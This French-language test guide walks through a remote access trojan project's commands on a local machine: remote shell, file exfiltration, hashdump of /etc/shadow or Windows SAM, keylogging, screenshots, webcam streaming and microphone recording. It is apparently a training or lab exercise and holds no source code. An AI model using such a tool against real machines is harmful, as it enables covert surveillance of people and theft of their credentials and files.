# Guide de test — RAT Project

---

## Etape 1 — Installation

```bash
cd rat_project
poetry lock --no-update
poetry install
python generate_cert.py
```

Verifier que tout est installe :

```bash
poetry run pytest tests/ -v
```

Resultat attendu : `29 passed`.

---

## Etape 2 — Lancer le serveur (Terminal 1)

```bash
./rat
```

Taper `1` puis Entree.

Le serveur affiche :

```
[*] Listening on 8888... (TLS)
rat >
```

---

## Etape 3 — Lancer le client (Terminal 2)

```bash
./rat
```

Taper `2` puis Entree.

Le serveur (Terminal 1) affiche :

```
[+] Agent 1 connected (127.0.0.1 | nom_machine)
```

---

## Etape 4 — Entrer en session avec l'agent (Terminal 1)

```
rat > interact 1
```

L'invite devient `rat agent 1 >`. Toutes les commandes ci-dessous se tapent ici.

---

## Etape 5 — Tester chaque commande

### 5.1 — help

```
rat agent 1 > help
```

Resultat attendu : liste de toutes les commandes disponibles.

---

### 5.2 — ipconfig

```
rat agent 1 > ipconfig
```

Resultat attendu : sortie de `ip addr` (Linux) ou `ipconfig /all` (Windows).

---

### 5.3 — sysinfo

```
rat agent 1 > sysinfo
```

Resultat attendu : sortie de `uname -a` (Linux) ou `systeminfo` (Windows).

---

### 5.4 — screenshot

```
rat agent 1 > screenshot
```

Resultat attendu :

```
Screenshot pris.
[+] Image saved: screenshot_YYYYMMDD_HHMMSS.jpg
```

Le fichier `.jpg` est cree dans le repertoire courant du serveur.

> Prerequis : un environnement graphique (X11/Wayland) doit etre actif.

---

### 5.5 — shell

```
rat agent 1 > shell
```

Puis taper des commandes :

```
shell > whoami
shell > ls -la
shell > pwd
shell > exit
```

Resultat attendu : les sorties s'affichent. `exit` ferme le shell.

---

### 5.6 — search

```
rat agent 1 > search hostname
```

Resultat attendu : liste des chemins vers les fichiers nommes `hostname`.

> La recherche parcourt tout le disque, elle peut prendre du temps.

---

### 5.7 — download

```
rat agent 1 > download /etc/hostname
```

Resultat attendu :

```
[+] File saved: downloads/hostname (X bytes)
```

Le fichier est sauvegarde dans `downloads/` cote serveur.

---

### 5.8 — upload

D'abord, creer un fichier test dans un **Terminal 3** :

```bash
echo "test upload" > /tmp/test_upload.txt
```

Puis dans Terminal 1 :

```
rat agent 1 > upload /tmp/test_upload.txt
```

Resultat attendu :

```
File received and saved: test_upload.txt (X bytes)
```

---

### 5.9 — hashdump

**Sans sudo (comportement normal) :**

```
rat agent 1 > hashdump
```

Resultat attendu : `Error: permission denied to read /etc/shadow (root required)`

**Avec sudo :** fermer le client (Terminal 2), puis le relancer avec :

```bash
sudo PYTHONPATH=src $(poetry env info -e) -m rat_project.app.main
```

Taper `2` pour lancer le client en root.
Puis dans Terminal 1 :

```
rat > interact 2
rat agent 2 > hashdump
```

Resultat attendu : contenu de `/etc/shadow`.

---

### 5.10 — keylogger

```
rat agent 1 > keylogger
```

Resultat attendu : `Keylogger started.`

Taper quelques touches dans n'importe quelle fenetre, puis :

```
rat agent 1 > keylogger
```

Resultat attendu :

```
Keylogger stopped.
Captured keystrokes:
[les touches tapees]
```

---

### 5.11 — webcam_snapshot

```
rat agent 1 > webcam_snapshot
```

Resultat attendu :

```
Snapshot webcam pris.
[+] Image saved: webcam_snapshot_YYYYMMDD_HHMMSS.jpg
```

> Prerequis : une webcam doit etre branchee.

---

### 5.12 — webcam_stream

```
rat agent 1 > webcam_stream
```

Une fenetre OpenCV s'ouvre avec le flux en direct.
Appuyer sur `q` dans la fenetre pour arreter.

> Prerequis : webcam branchee + environnement graphique actif.

---

### 5.13 — record_audio

```
rat agent 1 > record_audio
```

Ou avec une duree personnalisee :

```
rat agent 1 > record_audio 10
```

Resultat attendu :

```
[+] Audio saved: recordings/audio_XXXXXXXXXX.wav (X bytes)
```

> Prerequis : un microphone doit etre disponible.

---

### 5.14 — back

```
rat agent 1 > back
```

Retour au menu serveur `rat >`.

---

### 5.15 — sessions

```
rat > sessions
```

Resultat attendu : liste des agents connectes.

---

### 5.16 — exit

```
rat > exit
```

Le serveur s'arrete.

---

## Tests sur Windows

Les commandes sont identiques. Differences :

| Commande | Linux | Windows |
|---|---|---|
| Lancement | `./rat` | `.\rat.bat` |
| `ipconfig` | `ip addr` | `ipconfig /all` |
| `sysinfo` | `uname -a` | `systeminfo` |
| `shell` | bash | cmd.exe |
| `search` | depuis `/` | depuis `C:\` |
| `hashdump` | `/etc/shadow` (root) | SAM + SYSTEM (Administrateur) |
| `hashdump` sudo | `sudo PYTHONPATH=src ...` | Ouvrir PowerShell en Administrateur |

---

## Tableau recapitulatif

| # | Commande | Droits speciaux | Prerequis materiel |
|---|---|---|---|
| 1 | `help` | Aucun | - |
| 2 | `ipconfig` | Aucun | - |
| 3 | `sysinfo` | Aucun | - |
| 4 | `screenshot` | Aucun | Ecran graphique |
| 5 | `shell` | Aucun | - |
| 6 | `search <nom>` | Aucun | - |
| 7 | `download <path>` | Lecture sur le fichier | - |
| 8 | `upload <path>` | Aucun | - |
| 9 | `hashdump` | **Root / Administrateur** | - |
| 10 | `keylogger` | Aucun | - |
| 11 | `webcam_snapshot` | Aucun | Webcam |
| 12 | `webcam_stream` | Aucun | Webcam + ecran |
| 13 | `record_audio` | Aucun | Microphone |
